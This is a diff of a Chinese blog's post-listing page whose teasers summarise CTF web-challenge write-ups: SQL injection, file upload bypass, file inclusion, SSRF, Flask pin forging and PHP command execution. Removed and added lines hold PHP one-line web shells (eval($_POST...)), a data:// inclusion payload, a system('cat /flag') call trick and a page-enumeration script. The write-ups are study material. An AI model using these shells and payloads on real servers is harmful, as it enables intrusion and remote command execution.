@@ -204,15 +204,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">89</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">3</div>
+    <div class="sidebar-state-number">4</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">35</div>
+    <div class="sidebar-state-number">66</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -272,26 +272,32 @@
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" aria-label="文件上传绕过姿势"></a>
+      <a class="post-link" href="/2025/04/01/%5BRCTF2015%5DEasySQL/" aria-label="[RCTF2015]EasySQL"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="文件上传绕过姿势" class="lazyload">
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[RCTF2015]EasySQL" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-23</span>
-        <span><span class="icon-pencil"></span>471 字</span>
+        <span><span class="icon-calendar"></span>2025-04-01</span>
+        <span><span class="icon-pencil"></span>535 字</span>
         <span><span class="icon-clock"></span>2 分钟</span>
       </div>
-      <h2 class="post-title">文件上传绕过姿势</h2>
+      <h2 class="post-title">[RCTF2015]EasySQL</h2>
       <article class="post-article">
         
-           短标签
-1234567891011&amp;lt;?php eval($_POST[&amp;#x27;a&amp;#x27;]) ?&amp;gt;&amp;lt;?php assert(@$_POST[&amp;#x27;a&amp;#x27;]); ?&amp;gt;&amp;lt;?=eval($_POST[1]);?&amp;gt;&amp;lt;?=eval($_POST&amp;#123;1&amp;#125;);?&amp;gt;&amp;lt;?=system(&amp;#x27;tac ../f*&amp;#x27;)?&amp;gt;&amp;lt;?=`tac ../f*`?&amp;gt;
-123456789101112131415161718&amp;lt;?php$fun = create_function(&amp;#x27;&amp;#x
+           用户首页发现一个登录栏，注册栏，我们注册并登录发现有个修改密码的地方
+
+总共就只有这三处可以进行注入
+我们注册admin的账号发现存在用户，那我们尝试使用二次注入来登录admin的账号
+12345678910111213注册admin&amp;quot;密码为1登录admin&amp;quot;密码为1修改密码1-&amp;gt;2重返登录界面登录admin密码为2登录成功
+
+我们成功登录admin的账号，但未发现flag，但起码证明了注册页面存在二次注入
+那我们猜测后端注册页面的sql语句为
+1select * from user where username=&amp;quot;xxx&amp;quot; and passwo
         
       </article>
     </div>
@@ -301,60 +307,63 @@
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/22/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz/" aria-label="[网鼎杯 2020 青龙组]AreUSerialz"></a>
+      <a class="post-link" href="/2025/03/31/JWT/" aria-label="JWT"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[网鼎杯 2020 青龙组]AreUSerialz" class="lazyload">
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="JWT" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-22</span>
-        <span><span class="icon-pencil"></span>478 字</span>
+        <span><span class="icon-calendar"></span>2025-03-31</span>
+        <span><span class="icon-pencil"></span>266 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
+      </div>
+      <h2 class="post-title">JWT</h2>
+      <article class="post-article">
+        
+          JSON Web Token是什么
+JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。
+
+JWT由三部分组成，类似于xxx.yyy.zzz，前两部分是base64编码的内容，第三部分是加密的签名部分
+第一部分被称为header,会说明字符串的类型以及加密方式，当然还会包含其他一些字段，在介绍JWT安全问题时会涉及到部分。
+第二部分被称为payload,包含用户的身份id,是否是管理权限等字段，这部分中的相关字段可以根据实际情况自行定义。
+第三部分
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/31/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun/" aria-label="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[CISCN2019 华北赛区 Day1 Web2]ikun" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-31</span>
+        <span><span class="icon-pencil"></span>408 字</span>
         <span><span class="icon-clock"></span>2 分钟</span>
       </div>
-      <h2 class="post-title">[网鼎杯 2020 青龙组]AreUSerialz</h2>
+      <h2 class="post-title">[CISCN2019 华北赛区 Day1 Web2]ikun</h2>
       <article class="post-article">
         
-          题目源码：
-1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&amp;lt;?phpinclude(&amp;quot;flag.php&amp;quot;);highlight_file(__FILE__);class FileHandler &amp;#123;    protected $op;    protected $filename;    protected $conte
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/21/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" aria-label="CTFSHOW-文件包含"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW-文件包含" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-21</span>
-        <span><span class="icon-pencil"></span>3.1k 字</span>
-        <span><span class="icon-clock"></span>14 分钟</span>
-      </div>
-      <h2 class="post-title">CTFSHOW-文件包含</h2>
-      <article class="post-article">
-        
-          说明：
-前几题举图示例
-后面由于感官问题就不列图了
- web78(无过滤)
-123456if(isset($_GET[&amp;#x27;file&amp;#x27;]))&amp;#123;    $file = $_GET[&amp;#x27;file&amp;#x27;];    include($file);&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125;
+          知识点：12pickle反序列化jwt构造
 
-我们先用data伪协议来查看flag在哪个文件中
-1?file=data://text/plain,&amp;lt;?php system(&amp;#x27;ls&amp;#x27;);?&amp;gt;
-发现是flag.php，那我们直接用da
+ ikun的题
+前面的步骤略述一下吧
+需买vp6
+我们用脚本把vp6的购买页面爆出来
+12345678import requestsurl=&amp;quot;http://7de96e39-e3e1-4117-ad12-5b29895ec975.node5.buuoj.cn/shop?page=&amp;quot;for i in range (0,2000):    print(i)    r = requests.get(url + str(i))    if &amp;#x27;lv6.png&amp;#x27; in r.text:        print(i)   
         
       </article>
     </div>
@@ -364,121 +373,24 @@
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/16/%5BGXYCTF2019%5DBabySQli/" aria-label="[GXYCTF2019]BabySQli"></a>
+      <a class="post-link" href="/2025/03/31/%5BZer0pts2020%5DCan%20you%20guess%20it/" aria-label="[Zer0pts2020]Can you guess it"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[GXYCTF2019]BabySQli" class="lazyload">
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[Zer0pts2020]Can you guess it" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-16</span>
-        <span><span class="icon-pencil"></span>406 字</span>
-        <span><span class="icon-clock"></span>1 分钟</span>
-      </div>
-      <h2 class="post-title">[GXYCTF2019]BabySQli</h2>
-      <article class="post-article">
-        
-          
-这一看就是一个sql注入题
-我们先来试过滤
-1234name=1&amp;#x27;=#-&amp;gt;被过滤name=1&amp;#x27;( -&amp;gt;被过滤name=1&amp;#x27;) -&amp;gt;被过滤可知=，（，）都被过滤了
-那肯定不是寻常的sql注入了，因为括号都没了，还注啥呀
-到这里也是不知道办法
-题解说看源码
-源码里有用的就这些
-1234567891011121314151617181920212223242526272829303132333435363738&amp;lt;?phprequire &amp;quot;config.php&amp;quot;;require &amp;quot;flag.php&amp;quot;;$na
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/16/%5BSUCTF%202019%5DCheckIn/" aria-label="[SUCTF 2019]CheckIn"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[SUCTF 2019]CheckIn" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-16</span>
-        <span><span class="icon-pencil"></span>340 字</span>
-        <span><span class="icon-clock"></span>1 分钟</span>
-      </div>
-      <h2 class="post-title">[SUCTF 2019]CheckIn</h2>
-      <article class="post-article">
-        
-          
-我们先上传一个写有一句话木马的php文件试一下
-回显说文件后缀不能有ph
-所以我们php3,php5,phhtml都不能用了
-那我们再上传一个后缀名改为jpg的一句话木马文件
-
-发现不能有&amp;lt;?符号
-那我们使用js
-1&amp;lt;script language=&amp;#x27;php&amp;#x27;&amp;gt; @eval($_POST[&amp;#x27;pass&amp;#x27;]);&amp;lt;/script&amp;gt;
-再次提交
-
-发现它后端检查了文件的标识头
-那我们就可以修改一下文件的标识头
-1gif文件：直接在文件内容开头写入GIF89a就行，一般都用这个，因为好记
-再次上传，上传成功
-现在就要考虑如何将上传的j
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/15/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHardSQL/" aria-label="[极客大挑战 2019]HardSQL"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[极客大挑战 2019]HardSQL" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-15</span>
-        <span><span class="icon-pencil"></span>458 字</span>
+        <span><span class="icon-calendar"></span>2025-03-31</span>
+        <span><span class="icon-pencil"></span>555 字</span>
         <span><span class="icon-clock"></span>2 分钟</span>
       </div>
-      <h2 class="post-title">[极客大挑战 2019]HardSQL</h2>
+      <h2 class="post-title">[Zer0pts2020]Can you guess it</h2>
       <article class="post-article">
         
-          
- 判断过滤
- 法一(Fuzz测试)
- 法二(自己试)：
-过滤了空格
-试了很多，空格只能用反引号和括号来绕过
-过滤了**=**
-可以用like来绕过
-过滤了substring与mid
-可以用right与left来绕过
-知识点：
-RIGHT 是一个字符串函数，用于从字符串的右侧提取指定数量的字符
-1RIGHT(string, length)
-
-string：要提取字符的字符串。
-length：要提取的字符数。如果 length 大于字符串的长度，则返回整个字符串。
-
-LEFT 是一个字符串函数，用于从字符串的左侧提取指定数量的字符。它的语法如下：
-1LEFT(string, length)
-
-s
+          知识点：1234567891011$_SERVER[&amp;#x27;PHP_SELF&amp;#x27;] 包含了当前执行脚本的文件路径/index.php/index.php/aaa.php这两种访问的都是index.php，可能是因为aaa.php不存在basename()可以理解为对传入的参数路径截取最后一段作为返回值，但是该函数发现最后一段为不可见字符时会退取上一层的目录$var1=&amp;quot;/config.php/test&amp;quot;basename($var1)	=&amp;gt; test$var2=&amp;quot;/config.php/%ff&amp;quot;basename($var2)	=&amp;gt;	
         
       </article>
     </div>
@@ -488,161 +400,189 @@ s
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/14/%5BMRCTF2020%5D%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/" aria-label="[MRCTF2020]你传你🐎呢"></a>
+      <a class="post-link" href="/2025/03/31/%5BSUCTF%202019%5DPythonginx/" aria-label="[SUCTF 2019]Pythonginx"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[MRCTF2020]你传你🐎呢" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[SUCTF 2019]Pythonginx" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-14</span>
-        <span><span class="icon-pencil"></span>308 字</span>
-        <span><span class="icon-clock"></span>1 分钟</span>
-      </div>
-      <h2 class="post-title">[MRCTF2020]你传你🐎呢</h2>
-      <article class="post-article">
-        
-          
- 判断检验方式
-我们发现前端是没有检验的
-所以是后端检验文件
-我们先试着上传一个php文件，里面有一句话木马–&amp;gt;上传失败
-上传php文件，抓包修改文件后缀名为png–&amp;gt;上传失败
-上传php文件，抓包修改文件后缀名和Content-Type:png 和 image/png --&amp;gt;上传成功
-所以我们猜测是对文件后缀名和Content-Type进行了校验
- 如何成功解析php文件
-但当我们上传了文件之后发现它变成了一个png文件，无法正常解析为php文件
-所以我们需要一个外物来助它变为php文件
-这时候就想到了.user.ini文件和.htaccess文件
-这里上传.user.i
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/13/%5BBJDCTF2020%5DEasy%20MD5/" aria-label="[BJDCTF2020]Easy MD5"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[BJDCTF2020]Easy MD5" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-13</span>
-        <span><span class="icon-pencil"></span>210 字</span>
-        <span><span class="icon-clock"></span>1 分钟</span>
-      </div>
-      <h2 class="post-title">[BJDCTF2020]Easy MD5</h2>
-      <article class="post-article">
-        
-          没找到有用信息
-抓个包看看
-
-响应包里看到一个查询语句
-有个md5语法
- 第一关(md5的sql注入)
-
-所以我们需要输入一个字符串使得它md5加密后返回’or’XXXXXXXXX(这里的XXXXX是一些乱码和不可见字符)
-这里的SQL语句会变成
-1select * from `admin` where password=&amp;#x27;&amp;#x27;or&amp;#x27;XXXXXXXXX&amp;#x27;  
-这里用：ffifdyop,这个MD5加密后会返回’or’6XXXXXXXXX
- 第二关(md5弱比较)
-查看源码
-
-这里随便上传两个md5编码后是0e…的就行了
-12345678910PM1kVTMB
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/13/%5BRoarCTF%202019%5DEasy%20Calc/" aria-label="[RoarCTF 2019]Easy Calc"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[RoarCTF 2019]Easy Calc" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-13</span>
-        <span><span class="icon-pencil"></span>456 字</span>
-        <span><span class="icon-clock"></span>1 分钟</span>
-      </div>
-      <h2 class="post-title">[RoarCTF 2019]Easy Calc</h2>
-      <article class="post-article">
-        
-          知识点：
-12php字符串解析漏洞ACII编码
-这算是一个php特性漏洞题
-查看源码发现calc.php
-进入发现waf
-
-这里的意思是get传的参数不能包含所过滤的字符(空格、/…)
-最后这里也是解题的关键：eval命令执行
-这里需要了解两个知识点：
-php字符串解析漏洞
-12345678910111213141516我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或$_POST的关联数组例如：/?foo=bar变成Array([foo] =&amp;gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替例如，/?%20news[id%00=42
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/12/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/" aria-label="[强网杯 2019]随便注"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[强网杯 2019]随便注" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-12</span>
-        <span><span class="icon-pencil"></span>991 字</span>
+        <span><span class="icon-calendar"></span>2025-03-31</span>
+        <span><span class="icon-pencil"></span>861 字</span>
         <span><span class="icon-clock"></span>3 分钟</span>
       </div>
-      <h2 class="post-title">[强网杯 2019]随便注</h2>
+      <h2 class="post-title">[SUCTF 2019]Pythonginx</h2>
       <article class="post-article">
         
-           判断闭合方式
-看题目这是一个sql注入题
+           题目源码：
+12345678910111213141516171819202122232425262728293031323334@app.route(&amp;#x27;/getUrl&amp;#x27;, methods=[&amp;#x27;GET&amp;#x27;, &amp;#x27;POST&amp;#x27;])def getUrl():    # 从请求中获取url参数    url = request.args.get(&amp;quot;url&amp;quot;)    host = parse.urlparse(url).hostname    # 第一处检查主机名是否为 &amp;#x27;suctf.cc&amp;#x27;    if h
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/30/%5BFBCTF2019%5DRCEService/" aria-label="[FBCTF2019]RCEService"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="../images/1737907114de8a.jpg" data-sizes="auto" alt="[FBCTF2019]RCEService" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-30</span>
+        <span><span class="icon-pencil"></span>1.6k 字</span>
+        <span><span class="icon-clock"></span>6 分钟</span>
+      </div>
+      <h2 class="post-title">[FBCTF2019]RCEService</h2>
+      <article class="post-article">
+        
+            
+题目界面如上
+它说需要我们传入一个json格式的命令
+我们传入
+&amp;#123;&amp;quot;cmd&amp;quot;:&amp;quot;ls&amp;quot;&amp;#125;
+回显出来了index.php
+但当我们传入
+&amp;#123;&amp;quot;cmd&amp;quot;:&amp;quot;ls /&amp;quot;&amp;#125;
+发现&amp;#x2F;被过滤了
+经过多次尝试，发现好多符号都被过滤了
+没办法了，看题解
+题解说这题是有源码的…我没找到…题目的问题
+题目源码：
+123456789101112131415161718192021&amp;lt;?phpputenv(&amp;#x27;PATH=/home/rceservice/jail&amp;#x27;
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/30/%5BGYCTF2020%5DFlaskApp/" aria-label="[GYCTF2020]FlaskApp"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="../images/1737907114de8a.jpg" data-sizes="auto" alt="[GYCTF2020]FlaskApp" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-30</span>
+        <span><span class="icon-pencil"></span>1.4k 字</span>
+        <span><span class="icon-clock"></span>7 分钟</span>
+      </div>
+      <h2 class="post-title">[GYCTF2020]FlaskApp</h2>
+      <article class="post-article">
+        
+          知识点：pin码生成123456789101112131415161718pin码生成要六要素1.username 在可以任意文件读的条件下读 /etc/passwd进行猜测2.modname 默认flask.app3.appname 默认Flask4.moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量5.uuidnode mac地址的十进制unbuntu读取 /sys/class/net/eth0/addresscentos读取  /sys/class/net/ens33/address6.machine_id 机器码linux的id一般存放在
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/30/%5BBJDCTF2020%5DEasySearch/" aria-label="[BJDCTF2020]EasySearch"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[BJDCTF2020]EasySearch" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-30</span>
+        <span><span class="icon-pencil"></span>558 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
+      </div>
+      <h2 class="post-title">[BJDCTF2020]EasySearch</h2>
+      <article class="post-article">
+        
+          知识点1234567ssi注入：SSI 注入全称Server-Side Includes Injection（服务端包含注入），ssi可以赋予html静态页面的动态效果，通过ssi执行命令，返回对应的结果当在网站目录中发现了.stm .shtm .shtml或在界面中发现了&amp;lt;div&amp;gt;&amp;#123;$what&amp;#125;&amp;lt;/div&amp;gt;&amp;lt;p&amp;gt;Welcome, &amp;#123;&amp;#123;username&amp;#125;&amp;#125;&amp;lt;/p&amp;gt;&amp;lt;div&amp;gt;&amp;#123;%$a%&amp;#125;&amp;lt;/div&amp;gt;就容易产生ssi注入，此处问题的其注入格式为：&amp;
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/29/%5BDe1CTF%202019%5DSSRF%20Me/" aria-label="[De1CTF 2019]SSRF Me"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[De1CTF 2019]SSRF Me" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-29</span>
+        <span><span class="icon-pencil"></span>1.2k 字</span>
+        <span><span class="icon-clock"></span>5 分钟</span>
+      </div>
+      <h2 class="post-title">[De1CTF 2019]SSRF Me</h2>
+      <article class="post-article">
+        
+            知识点：
+1flask框架
 
-通过get传参来获取数据
-那我们首先来判断注入类型
-1234输入1-&amp;gt;正常回显输入1&amp;#x27;-&amp;gt;报错输入1“-&amp;gt;正常回显总结：这是一个字符型注入，且用单引号闭合
- 判断过滤信息
-但当我们输入select时，它回显内容为：
+题目源码：
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113from flask import Flask, request  # 导入Flask和re
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/28/%5BCISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math/" aria-label="[CISCN 2019 初赛]Love Math"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="../images/17369576223624.jpg" data-sizes="auto" alt="[CISCN 2019 初赛]Love Math" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-28</span>
+        <span><span class="icon-pencil"></span>1.1k 字</span>
+        <span><span class="icon-clock"></span>5 分钟</span>
+      </div>
+      <h2 class="post-title">[CISCN 2019 初赛]Love Math</h2>
+      <article class="post-article">
+        
+          知识点：123php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat/flag’);例：?c=($_GET[a])($_GET[b])&amp;amp;a=system&amp;amp;b=cat /flag
 
-告诉我们select已被过滤了，不能使用联合注入、报错注入
- 查找所能得到的信息
-那我们还剩下一个堆叠注入
-输入&#39;;show databases;
-回显出了数据库信息
-
-输入&#39;;show tables;
-回显出了表信息
-
-输入&#39;;show columns from 1919810931114514;
-回显出
+ 题目源码：
+123456789101112131415161718192021222324252627&amp;lt;?php//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;    show_source(__FILE__);&amp;#125;else&amp;#123;  
         
       </article>
     </div>
@@ -653,7 +593,7 @@ php字符串解析漏洞
 
   <nav id="page-nav" data-aos="fade-up">
     
-    <a class="extend prev" rel="prev" href="/page/2/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/2/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/4/">下一页 &raquo;</a>
   </nav>
 
 
@@ -682,10 +622,10 @@ php字符串解析漏洞
     
       <div>
         <span class="icon-brush"></span>
-        91.7k
+        120.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        06:19
+        08:20
       </div>
     
     
@@ -721,15 +661,15 @@ php字符串解析漏洞
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">89</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">3</div>
+    <div class="sidebar-state-number">4</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">35</div>
+    <div class="sidebar-state-number">66</div>
   </div>
 </div>
 <div class="sidebar-social">
